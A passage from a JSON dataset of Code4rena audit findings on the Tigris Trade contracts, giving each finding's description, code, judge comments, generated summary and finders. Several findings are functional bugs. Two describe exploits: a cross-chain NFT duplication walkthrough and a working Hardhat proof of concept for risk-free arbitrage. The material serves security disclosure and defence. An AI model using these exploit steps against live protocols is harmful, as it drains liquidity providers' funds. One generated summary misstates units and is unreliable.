https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419175169 \n\n\n\n***\n\n",
      "summary": "\nThis bug report is about GovNFT, a smart contract. In GovNFT, the setMaxBridge function is provided to set a maximum bridge limit, but this variable is not used and does not work. This means that the number of GovNFTs crossing the chain is not limited. A proof of concept is provided in the report. No tools were used to find the bug. \n\nThe recommended mitigation step is to consider applying the maxBridge variable, so that the number of GovNFTs crossing the chain is limited.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/334",
      "tags": [],
      "finders": [
        "cccz",
        "unforgiven",
        "Madalad",
        "0xbepresent"
      ]
    },
    {
      "id": "6337",
      "title": "[M-07] Trading will not work on Ethereum if USDT is used",
      "impact": "MEDIUM",
      "content": "\nTraders will not be able to:\n\n1.  Initiate a market order\n2.  Add margin\n3.  Add to position\n4.  initiate limit order\n\nIf USDT is set as the margin asset and protocol is deployed on Ethereum.\n\n(Note: this issue was submitted after consulting with the sponsor even though currently there are no plans to deploy the platform on Ethereum).\n\n### Proof of Concept\n\n`USDT` has a race condition protection mechanism on ethereum chain:\n\nIt does not allow users to change the allowance without first changing the allowance to 0.\n\n`approve` function in `USDT` on Ethereum: <br><https://etherscan.io/token/0xdac17f958d2ee523a2206206994597c13d831ec7#code#L205>\n\n        function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\n\n            // To change the approve amount you first have to reduce the addresses`\n            //  allowance to zero by calling `approve(_spender, 0)` if it is not\n            //  already 0 to mitigate the race condition described here:\n            //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n            require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\n\n            allowed[msg.sender][_spender] = _value;\n            Approval(msg.sender, _spender, _value);\n        }\n\nIn `Trading`, if users use `USDT` as margin to:\n\n1.  Initiate a market order\n2.  Add margin\n3.  Add to position\n4.  initiate limit order\n\nThe transaction will revert.\n\nThis is due to the the `_handleDeposit` which is called in all of the above uses.\n\n`_handleDeposit` calls the `USDT` margin asset `approve` function with `type(uint).max`.\n\nFrom the second time `approve` will be called, the transaction will revert.\n\n`_handleDeposit` in `Trading`: <br><https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L652>\n\n        function _handleDeposit(address _tigAsset, address _marginAsset, uint256 _margin, address _stableVault\n    , ERC20PermitData calldata _permitData, address _trader) internal {\n    ------\n                IERC20(_marginAsset).transferFrom(_trader, address(this), _margin/_marginDecMultiplier);\n                IERC20(_marginAsset).approve(_stableVault, type(uint).max);\n                IStableVault(_stableVault).deposit(_marginAsset, _margin/_marginDecMultiplier);\n    ------\n        }\n\n### Tools Used\n\nVS Code\n\n### Recommended Mitigation Steps\n\nNo need to to approve `USDT` every time.\nThe protocol could:\n\n1.  Keep a record if allowance was already set on an address\n2.  Create an external function that can be called by the owner to approve the a token address\n\n**[TriHaz (Tigris Trade) confirmed](https://github.com/code-423n4/2022-12-tigris-findings/issues/198)**  \n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/198#issuecomment-1385223243):**\n > In contrast to unsafeERC20 functions (OOS), this report shows an issue with USDT or similar tokens that require a zero to non-zero allowance.\n> \n> Not resetting to zero and instead calling to set max multiple times will cause reverts in those cases.\n> \n> For this reason I agree with Medium Severity.\n\n**[GainsGoblin (Tigris Trade) resolved](https://github.com/code-423n4/2022-12-tigris-findings/issues/198#issuecomment-1407500907):**\n > Mitigation: https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419174789 \n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the Trading contract that exists when USDT is set as the margin asset and the protocol is deployed on Ethereum. This vulnerability prevents traders from initiating a market order, adding margin, adding to position and initiating limit order. The issue was submitted after consulting with the sponsor, even though there were no plans to deploy the platform on Ethereum.\n\nThe vulnerability is caused by the approve function in USDT on Ethereum, which requires users to first change the allowance to 0 before changing it again. This is to mitigate the race condition described in the EIPs. The _handleDeposit function in Trading calls the USDT margin asset approve function with type(uint).max, which will cause the transaction to revert from the second time it is called.\n\nThe recommended mitigation steps are to keep a record if allowance was already set on an address, and create an external function that can be called by the owner to approve the token address. This will prevent the need to approve USDT every time.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/198",
      "tags": [],
      "finders": [
        "8olidity",
        "Faith",
        "0x52",
        "rbserver",
        "Rolezn",
        "Ruhum",
        "KingNFT",
        "0xdeadbeef0x",
        "mookimgo"
      ]
    },
    {
      "id": "6336",
      "title": "[M-06] BondNFTs can revert when transferred",
      "impact": "MEDIUM",
      "content": "\n`BondNFT`s should be transferrable. According the the proposal and the sponsor, `BondNFT`s should could be sold and borrowed against.\n\nThe proposal for context: <https://gov.tigris.trade/#/proposal/0x2f2d1d63060a4a2f2718ebf86250056d40380dc7162fb4bf5e5c0b5bee49a6f3>\n\nThe current implementation limits selling/depositing to only the same day that rewards are distributed for the `tigAsset` of the bond.\n\nThe impact if no rewards are distributed in the same day:\n\n1.  `BondNFT`s listed on open markets will not be able to fulfill the orders\n2.  `BondNFT`s deposited as collateral will not be able to release the collateral\n\nBecause other market/platforms used for selling/depositing will not call `claimGovFees` to distribute rewards, they will revert when trying to transfer the `BondNFT`.\n\nRealistic examples could be `BondNFT`s listed on OpenSea.\n\nExample of reasons why rewards would not be distributed in the same day:\n\n1.  Low activity from investors, rewards are distributed when users lock/release/extend\n2.  `tigAsset` is blacklisted in `BondNFT`, rewards will not be distributed in such case.\n\n### Proof of Concept\n\n`BondNFT` has a mechanism to update the time `tigAsset` rewards are distributed. It uses a map that points to the last timestamp rewards were distributed for `epoch[tigAsset]`.\n\n`distribute` function in `BondNFT`: <br><https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L221>\n\n        function distribute(\n            address _tigAsset,\n            uint _amount\n        ) external {\n            if (totalShares[_tigAsset] == 0 || !allowedAsset[_tigAsset]) return;\n            IERC20(_tigAsset).transferFrom(_msgSender(), address(this), _amount);\n            unchecked {\n                uint aEpoch = block.timestamp / DAY;\n                if (aEpoch > epoch[_tigAsset]) {\n                    for (uint i=epoch[_tigAsset]; i<aEpoch; i++) {\n                        epoch[_tigAsset] += 1;\n                        accRewardsPerShare[_tigAsset][i+1] = accRewardsPerShare[_tigAsset][i];\n                    }\n                }\n                accRewardsPerShare[_tigAsset][aEpoch] += _amount * 1e18 / totalShares[_tigAsset];\n            }\n            emit Distribution(_tigAsset, _amount);\n        }\n\n(Please note that if the asset is blacklisted through `allowedAsset`, the  `epoch[tigAsset]` will not be updated)\n\nWhen `BondNFT`s are transferred, a check is implemented to make sure `epoch[tigAsset]` is updated to the current day.\n\nAccording to the sponsor, the reason for this check is to make sure that a bond that should be expired doesn't get transferred while the epoch hasn't yet been updated.\n\n`_transfer` function in `BondNFT`: \n<https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L329>\n\n        function _transfer(\n            address from,\n            address to,\n            uint256 _id\n        ) internal override {\n            Bond memory bond = idToBond(_id);\n            require(epoch[bond.asset] == block.timestamp/DAY, \"Bad epoch\");\n            require(!bond.expired, \"Expired!\");\n            unchecked {\n                require(block.timestamp > bond.mintTime + 300, \"Recent update\");\n                userDebt[from][bond.asset] += bond.pending;\n                bondPaid[_id][bond.asset] += bond.pending;\n            }\n            super._transfer(from, to, _id);\n        }\n\nAs can be seen above, if `epoch[tigAsset]` is not set to the same day of the transfer, the transfer will fail and the impacts in the impact section will happen.\n\n### Hardhat POC\n\nThere is already an implemented test showing that transfers fail when `epoch[tigAsset]` is not updated: \n\n<https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/test/09.Bonds.js#L472>\n\n        it(\"Bond can only transferred if epoch is updated\", async function () {\n          await stabletoken.connect(owner).mintFor(owner.address, ethers.utils.parseEther(\"3000\"));\n          await lock.connect(owner).lock(StableToken.address, ethers.utils.parseEther(\"3000\"), 365);\n\n          await network.provider.send(\"evm_increaseTime\", [864000]);\n          await network.provider.send(\"evm_mine\");\n\n          await expect(bond.connect(owner).safeTransferMany(user.address, [1])).to.be.revertedWith(\"Bad epoch\");\n        });\n\n### Tools Used\n\nVS Code, Hardhat\n\n### Recommended Mitigation Steps\n\nThe reason for the check is to validate that a bond.expired updated according to the actual timestamp.\n\nInstead of having\n\n            require(epoch[bond.asset] == block.timestamp/DAY, \"Bad epoch\");\n            require(!bond.expired, \"Expired!\");\n\nYou could replace it with:\n\n     require(bond.expireEpoch  >= block.timestamp/DAY, \"Transfer after expired not allowed\");\n\n**[TriHaz (Tigris Trade) confirmed](https://github.com/code-423n4/2022-12-tigris-findings/issues/162)** \n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/162#issuecomment-1383893616):**\n > The warden has shown a way for the BondNFT to not be transferable, because this shows a functionality loss, given a specific circumstance, I agree with Medium Severity.\n\n**[GainsGoblin (Tigris Trade) resolved](https://github.com/code-423n4/2022-12-tigris-findings/issues/162#issuecomment-1407489822):**\n > Mitigation: https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419174264  \n\n***\n\n",
      "summary": "\nThis bug report is about the BondNFT contract, which should be transferrable but is not due to a check implemented in the _transfer function. The check requires that the epoch[tigAsset] is updated to the current day, otherwise the transfer will fail. This can cause two major impacts: BondNFTs listed on open markets will not be able to fulfil orders, and BondNFTs deposited as collateral will not be release the collateral. The reason for the check is to make sure that a bond that should be expired doesn't get transferred while the epoch hasn't yet been updated. A proof of concept has been implemented to show that transfers fail when epoch[tigAsset] is not updated. The recommended mitigation steps are to replace the check with a requirement that bond.expireEpoch is greater than or equal to block.timestamp/DAY.",
      "quality_score": 4,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/162",
      "tags": [],
      "finders": [
        "0xdeadbeef0x"
      ]
    },
    {
      "id": "6335",
      "title": "[M-05] Failure in endpoint can cause minting more than one NFT with the same token id in different chains",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/GovNFT.sol#L168\n\n\n## Vulnerability details\n\n## Impact\n\nIn the contract `GovNFT`, it is possible to bridge the governance NFT to other chains. It is also stated in the document that:\n>NFT holders only earn the profits generated by the platform on the chain that the NFT is on.\n\nIt is assumed that there is only one unique NFT per token id. But there is a scenario that can lead to have more than one NFT with the same token id on different chains.\n\n## Proof of Concept\n\n - Suppose Bob (honest user who owns an NFT with token id X on chain B) plans to bridge this NFT from chain B to chain A. So, Bob calls the function `crossChain` to bridge the NFT from chain B to chain A. Thus, his NFT will be burnt on chain B, and it is supposed to be minted on chain A.\nhttps://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/GovNFT.sol#L124\n - The `endpoint` is responsible to complete the bridging task on chain A.\n - Suppose the `endpoint` calls the function `lzReceive` with low gas on chain A, so that the transaction will be not successful.\n```\nfunction lzReceive(\n        uint16 _srcChainId,\n        bytes memory _srcAddress,\n        uint64 _nonce,\n        bytes memory _payload\n    ) external override {\n        require(_msgSender() == address(endpoint), \"!Endpoint\");\n        (bool success, bytes memory reason) = address(this).excessivelySafeCall(gasleft()*4/5, 150, abi.encodeWithSelector(this.nonblockingLzReceive.selector, _srcChainId, _srcAddress, _nonce, _payload));\n        // try-catch all errors/exceptions\n        if (!success) {\n            failedMessages[_srcChainId][_srcAddress][_nonce] = keccak256(_payload);\n            emit MessageFailed(_srcChainId, _srcAddress, _nonce, _payload, reason);\n        }\n    }\n```\nhttps://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/GovNFT.sol#L168\n - Since the transaction was not successful, the message will be added as a failed message.\n```\nfailedMessages[chainB][Bob's address][_nonce] = keccak256(_payload);\n```\nhttps://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/GovNFT.sol#L178\n - Then, due to network lag (or any server issue, or any failure in `endpoint`), the `endpoint` assumes that the transaction is not sent, and it again calls this function with enough gas, so, the NFT with token id X will be minted to Bob's address on chain A. The flow is as follows:\n`lzReceive` ==> `nonblockingLzReceive` ==> `_nonblockingLzReceive` ==> `_bridgeMint`\n - Now Bob has the NFT on chain A. Moreover, he has a failed message on chain A.\n - Then Bob calls the function `crossChain` to bridge that NFT from chain A to chain B. So, this NFT will be burnt on chain A, and minted to Bob's address on chain B.\n - Now, Bob has the NFT with token id X on chain B. Moreover, he has a failed message on chain A.\n - He calls the function `retryMessage` to retry the failed message on chain A.\nhttps://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/GovNFT.sol#L206\n - By doing so the NFT with token id X will be minted to Bob on chain A. The flow is as follows:\n`retryMessage` ==> `_nonblockingLzReceive` ==> `_bridgeMint`\n - Now Bob has the NFT with token id X on both chain A and chain B. This is the vulnerability. \n - Now he can for example sell the NFT on chain B while he is earning the profits generated by the platform on the chain A that the NFT is on.\n - Please note that Bob can not call the function `retryMessage` while he owns the NFT on chain A. Because during minting the NFT, it checks whether the token id exists or not. That is why Bob first bridges the NFT to another chain, and then retries the failed message.\n\n***The vulnerability is that when the message is failed, it is not considered as consumed, so in case of a failure in `endpoint` it is possible to both having failed message and being able to mint it at the same time.***\n\nPlease note that if this scenario happens again, more NFT with the same token id X will be minted to Bob on different chains.\n\n\n## Tools Used\n\n## Recommended Mitigation Steps\nIt is recommended to track the consumed messages, and add a consumed flag whenever the function `lzReceive` is called, because it will either immediately mint the NFT or add it to he failed messages to be minted later.\n```\nmapping(uint16 => mapping(bytes => mapping(uint64 => bool))) public consumedMessage;\n\n    function lzReceive(\n        uint16 _srcChainId,\n        bytes memory _srcAddress,\n        uint64 _nonce,\n        bytes memory _payload\n    ) external override {\n        \n        require(!consumedMessage[_srcChainId][_srcAddress][_nonce], \"already consumed\");\n        consumedMessage[_srcChainId][_srcAddress][_nonce] = true;\n\n        require(_msgSender() == address(endpoint), \"!Endpoint\");\n        (bool success, bytes memory reason) = address(this).excessivelySafeCall(gasleft()*4/5, 150, abi.encodeWithSelector(this.nonblockingLzReceive.selector, _srcChainId, _srcAddress, _nonce, _payload));\n        // try-catch all errors/exceptions\n        if (!success) {\n            failedMessages[_srcChainId][_srcAddress][_nonce] = keccak256(_payload);\n            emit MessageFailed(_srcChainId, _srcAddress, _nonce, _payload, reason);\n        }\n    }\n```",
      "summary": "\nA vulnerability has been identified in a smart contract called GovNFT, which is used to bridge governance NFTs between different chains. The vulnerability is that when a message is failed, it is not considered as consumed, so in case of a failure in the endpoint, it is possible to both have a failed message and be able to mint it at the same time. This means that a user could end up having two NFTs with the same token id on different chains.\n\nTo demonstrate the vulnerability, the example of Bob is used. Bob is an honest user who owns an NFT with token id X on chain B. He calls the function `crossChain` to bridge the NFT from chain B to chain A. The transaction is not successful, and the message is added as a failed message. Due to network lag, the endpoint assumes that the transaction is not sent, and it again calls this function with enough gas, so the NFT with token id X will be minted to Bob's address on chain A. Then, Bob calls the function `crossChain` to bridge that NFT from chain A to chain B. Now, Bob has the NFT with token id X on both chain A and chain B. This means that he can for example sell the NFT on chain B while he is earning the profits generated by the platform on the chain A that the NFT is on.\n\nTo mitigate this vulnerability, it is recommended to track the consumed messages, and add a consumed flag whenever the function `lzReceive` is called, because it will either immediately mint the NFT or add it to he failed messages to be minted later.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/150",
      "tags": [],
      "finders": [
        "HE1M"
      ]
    },
    {
      "id": "6334",
      "title": "[M-04] Approved operators of Position token can’t call Trading.initiateCloseOrder",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L235\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L847-L849\n\n\n## Vulnerability details\n\n## Impact\nApproved operators of owner of Position token can't call several function in Trading.\n\n## Proof of Concept\nFunctions that accept Position token in Trading are checking that the caller is owner of token using _checkOwner function.\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L847-L849\n```soldiity\n    function _checkOwner(uint _id, address _trader) internal view {\n        if (position.ownerOf(_id) != _trader) revert(\"2\"); //NotPositionOwner   \n    }\n```\nAs you can see this function doesn't allow to approved operators of token's owner to pass the check. As result functions are not possible to call for them on behalf of owner.\nFor example [here](https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L235) there is a check that doesn't allow to call initiateCloseOrder function.\n## Tools Used\nVsCode\n## Recommended Mitigation Steps\nAllow operators of token's owner to call functions on behalf of owner.",
      "summary": "\nThis bug report is about a vulnerability that affects the Trading contract, which is part of the code-423n4/2022-12-tigris repository. The bug allows approved operators of the owner of the Position token to not be able to call several functions in the Trading contract. The bug is caused by a check in the _checkOwner function that doesn't allow the approved operators to pass the check, and thus the functions are not possible to call for them on behalf of the owner. The recommended mitigation step is to allow operators of the token's owner to call functions on behalf of the owner. The bug was discovered using the VsCode tool.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/124",
      "tags": [],
      "finders": [
        "__141345__  UniversalCrypto",
        "rvierdiiev"
      ]
    },
    {
      "id": "6333",
      "title": "[M-03] Bypass the delay security check to win risk free funds",
      "impact": "MEDIUM",
      "content": "\nThe current implementation uses `_checkDelay()` function to prevent profitable opening and closing in the same tx with two different prices in the \"valid signature pool\". But the protection is not enough, an attacker can long with low price and short with high price at the same tx but two orders to lock profit and take risk free funds.\n\n### Proof of Concept\n\nThe following test case and comments show the details for how to exploit it:\n\n```\nconst { expect } = require(\"chai\");\nconst { deployments, ethers, waffle } = require(\"hardhat\");\nconst { parseEther, formatEther } = ethers.utils;\nconst { signERC2612Permit } = require('eth-permit');\n\ndescribe(\"Bypass delay check to earn risk free profit\", function () {\n\n  let owner;\n  let node;\n  let user;\n  let node2;\n  let node3;\n  let proxy;\n\n  let Trading;\n  let trading;\n\n  let TradingExtension;\n  let tradingExtension;\n\n  let TradingLibrary;\n  let tradinglibrary;\n\n  let StableToken;\n  let stabletoken;\n\n  let StableVault;\n  let stablevault;\n\n  let position;\n\n  let pairscontract;\n  let referrals;\n\n  let permitSig;\n  let permitSigUsdc;\n\n  let MockDAI;\n  let MockUSDC;\n  let mockusdc;\n\n  let badstablevault;\n\n  let chainlink;\n\n  beforeEach(async function () {\n    await deployments.fixture(['test']);\n    [owner, node, user, node2, node3, proxy] = await ethers.getSigners();\n    StableToken = await deployments.get(\"StableToken\");\n    stabletoken = await ethers.getContractAt(\"StableToken\", StableToken.address);\n    Trading = await deployments.get(\"Trading\");\n    trading = await ethers.getContractAt(\"Trading\", Trading.address);\n    TradingExtension = await deployments.get(\"TradingExtension\");\n    tradingExtension = await ethers.getContractAt(\"TradingExtension\", TradingExtension.address);\n    const Position = await deployments.get(\"Position\");\n    position = await ethers.getContractAt(\"Position\", Position.address);\n    MockDAI = await deployments.get(\"MockDAI\");\n    MockUSDC = await deployments.get(\"MockUSDC\");\n    mockusdc = await ethers.getContractAt(\"MockERC20\", MockUSDC.address);\n    const PairsContract = await deployments.get(\"PairsContract\");\n    pairscontract = await ethers.getContractAt(\"PairsContract\", PairsContract.address);\n    const Referrals = await deployments.get(\"Referrals\");\n    referrals = await ethers.getContractAt(\"Referrals\", Referrals.address);\n    StableVault = await deployments.get(\"StableVault\");\n    stablevault = await ethers.getContractAt(\"StableVault\", StableVault.address);\n    await stablevault.connect(owner).listToken(MockDAI.address);\n    await stablevault.connect(owner).listToken(MockUSDC.address);\n    await tradingExtension.connect(owner).setAllowedMargin(StableToken.address, true);\n    await tradingExtension.connect(owner).setMinPositionSize(StableToken.address, parseEther(\"1\"));\n    await tradingExtension.connect(owner).setNode(node.address, true);\n    await tradingExtension.connect(owner).setNode(node2.address, true);\n    await tradingExtension.connect(owner).setNode(node3.address, true);\n    await network.provider.send(\"evm_setNextBlockTimestamp\", [2000000000]);\n    await network.provider.send(\"evm_mine\");\n    permitSig = await signERC2612Permit(owner, MockDAI.address, owner.address, Trading.address, ethers.constants.MaxUint256);\n    permitSigUsdc = await signERC2612Permit(owner, MockUSDC.address, owner.address, Trading.address, ethers.constants.MaxUint256);\n\n    const BadStableVault = await ethers.getContractFactory(\"BadStableVault\");\n    badstablevault = await BadStableVault.deploy(StableToken.address);\n\n    const ChainlinkContract = await ethers.getContractFactory(\"MockChainlinkFeed\");\n    chainlink = await ChainlinkContract.deploy();\n\n    TradingLibrary = await deployments.get(\"TradingLibrary\");\n    tradinglibrary = await ethers.getContractAt(\"TradingLibrary\", TradingLibrary.address);\n    await trading.connect(owner).setLimitOrderPriceRange(1e10);\n  });\n\n\n  describe(\"Simulate long with low price and short with high price at the same tx to lock profit\", function () {\n    let longId;\n    let shortId;\n    beforeEach(async function () {\n        let TradeInfo = [parseEther(\"1000\"), MockDAI.address, StableVault.address, parseEther(\"10\"), 1, true, parseEther(\"0\"), parseEther(\"0\"), ethers.constants.HashZero];\n        let PriceData = [node.address, 1, parseEther(\"1000\"), 0, 2000000000, false];\n        let message = ethers.utils.keccak256(\n          ethers.utils.defaultAbiCoder.encode(\n            ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\n            [node.address, 1, parseEther(\"1000\"), 0, 2000000000, false]\n          )\n        );\n        let sig = await node.signMessage(\n          Buffer.from(message.substring(2), 'hex')\n        );\n        \n        let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];\n        longId = await position.getCount();\n        await trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address);\n        expect(await position.assetOpenPositionsLength(1)).to.equal(1);\n\n        TradeInfo = [parseEther(\"1010\"), MockDAI.address, StableVault.address, parseEther(\"10\"), 1, false, parseEther(\"0\"), parseEther(\"0\"), ethers.constants.HashZero];\n        PriceData = [node.address, 1, parseEther(\"1010\"), 0, 2000000000, false];\n        message = ethers.utils.keccak256(\n          ethers.utils.defaultAbiCoder.encode(\n            ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\n            [node.address, 1, parseEther(\"1010\"), 0, 2000000000, false]\n          )\n        );\n        sig = await node.signMessage(\n          Buffer.from(message.substring(2), 'hex')\n        );\n        \n        PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, false];\n        shortId = await position.getCount();\n        await trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address);\n        expect(await position.assetOpenPositionsLength(1)).to.equal(2);\n  \n    });\n\n\n    it.only(\"Exit at any price to take profit\", async function () {\n        // same time later, now we can close the orders\n        await network.provider.send(\"evm_setNextBlockTimestamp\", [2000000100]);\n        await network.provider.send(\"evm_mine\");\n\n        // any new price, can be changed to other price such as 950, just ensure enough margin\n        let closePrice = parseEther(\"1050\");\n        let closePriceData = [node.address, 1, closePrice, 0, 2000000100, false];\n        let closeMessage = ethers.utils.keccak256(\n          ethers.utils.defaultAbiCoder.encode(\n            ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\n            [node.address, 1, closePrice, 0, 2000000100, false]\n          )\n        );\n        let closeSig = await node.signMessage(\n          Buffer.from(closeMessage.substring(2), 'hex')\n        );\n        \n        let balanceBefore = await stabletoken.balanceOf(owner.address);\n        await trading.connect(owner).initiateCloseOrder(longId, 1e10, closePriceData, closeSig, StableVault.address, StableToken.address, owner.address);\n        await trading.connect(owner).initiateCloseOrder(shortId, 1e10, closePriceData, closeSig, StableVault.address, StableToken.address, owner.address);\n        let balanceAfter = await stabletoken.balanceOf(owner.address);\n        let principal = parseEther(\"1000\").add(parseEther(\"1010\"));\n\n        let profit = balanceAfter.sub(balanceBefore).sub(principal);\n        expect(profit.gt(parseEther(`50`))).to.equal(true);\n    });\n\n    it.only(\"Exit with another price pair to double profit\", async function () {\n      // some time later, now we can close the orders\n      await network.provider.send(\"evm_setNextBlockTimestamp\", [2000000100]);\n      await network.provider.send(\"evm_mine\");\n\n      // any new price pair, can be changed to other price such as (950, 960), just ensure enough margin\n      let closePrice = parseEther(\"1050\");\n      let closePriceData = [node.address, 1, closePrice, 0, 2000000100, false];\n      let closeMessage = ethers.utils.keccak256(\n        ethers.utils.defaultAbiCoder.encode(\n          ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\n          [node.address, 1, closePrice, 0, 2000000100, false]\n        )\n      );\n      let closeSig = await node.signMessage(\n        Buffer.from(closeMessage.substring(2), 'hex')\n      );\n      \n      let balanceBefore = await stabletoken.balanceOf(owner.address);\n\n      // close long with high price\n      await trading.connect(owner).initiateCloseOrder(longId, 1e10, closePriceData, closeSig, StableVault.address, StableToken.address, owner.address);\n\n\n      closePrice = parseEther(\"1040\");\n      closePriceData = [node.address, 1, closePrice, 0, 2000000100, false];\n      closeMessage = ethers.utils.keccak256(\n        ethers.utils.defaultAbiCoder.encode(\n          ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\n          [node.address, 1, closePrice, 0, 2000000100, false]\n        )\n      );\n      closeSig = await node.signMessage(\n        Buffer.from(closeMessage.substring(2), 'hex')\n      );\n      // close short with low price\n      await trading.connect(owner).initiateCloseOrder(shortId, 1e10, closePriceData, closeSig, StableVault.address, StableToken.address, owner.address);\n      let balanceAfter = await stabletoken.balanceOf(owner.address);\n      let principal = parseEther(\"1000\").add(parseEther(\"1010\"));\n\n      let profit = balanceAfter.sub(balanceBefore).sub(principal);\n      expect(profit.gt(parseEther(`100`))).to.equal(true);\n    });\n\n  });\n});\n\n\n```\n\nHow to run\n\nPut the test case to a new BypassDelayCheck.js file of test directory, and run:\n\n    npx hardhat test\n\nAnd the test result will be:\n\n      Bypass delay check to earn risk free profit\n        Simulate long with low price and short with high price at the same tx to lock profit\n          √ Exit at any price to take profit\n          √ Exit with another price pair to double profit\n\n### Tools Used\n\nVS Code, Hardhat\n\n### Recommended Mitigation Steps\n\nCache recent lowest and highest prices, open long order with the highest price and short order with the lowest price.\n\n**[TriHaz (Tigris Trade) disputed and  commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/108#issuecomment-1375828833):**\n > We don't think this is valid as price sig expires in a very small window that would prevent a big price difference that could work in the same transaction to long & short.\n >\n> Also we have spread and funding fees that would make this so hard to be profitable.\n\n**[Alex the Entreprenerd (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/108#issuecomment-1383763386):**\n > The finding is effectively saying that while a delay exist, it doesn't truly offer any security guarantees because a trader could just open a trade on both sides, by using 2 different prices that are active at the same time.\n> \n> Anytime the spread between the prices, magnified by leverage, is higher than the fees, the trade is profitable (an arbitrage) at the disadvantage of the LPers.\n> \n> I think we don't have sufficient information to irrevocably mark this as a security vulnerability (just like there's no guarantee of prices being active once at a time, there's no guarantee there won't be).\n> \n> For this reason, I believe the finding to be valid and of Medium Severity.\n> \n> The finding is worth investigating once the system is deployed as it's reliant on settings and oracle behaviour\n\n**[GainsGoblin (Tigris Trade) commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/108#issuecomment-1406969496):**\n > Oracle behaviour can easily mitigate this issue by setting appropriate spreads based on price movement, however there is nothing to be done in the contracts.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the \"Trading.sol\" code in the \"2022-12-tigris\" GitHub repository. It allows an attacker to exploit the \"_checkDelay()\" function and open a long order with a low price and a short order with a high price in the same transaction to lock in a risk-free profit. The proof of concept test case was written using the hardhat framework and VS Code. The test results showed that the attacker could take a profit of more than 50 ETH if they closed at any price, or double their profit if they closed at different prices.\n\nThe recommended mitigation steps are to cache recent lowest and highest prices, and open long orders with the highest price and short orders with the lowest price.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/108",
      "tags": [],
      "finders": [
        "0x52",
        "orion",
        "noot",
        "KingNFT",
        "chaduke",
        "Critical"
      ]
    },
    {
      "id": "6332",
      "title": "[M-02] Must approve 0 first",
      "impact": "MEDIUM",
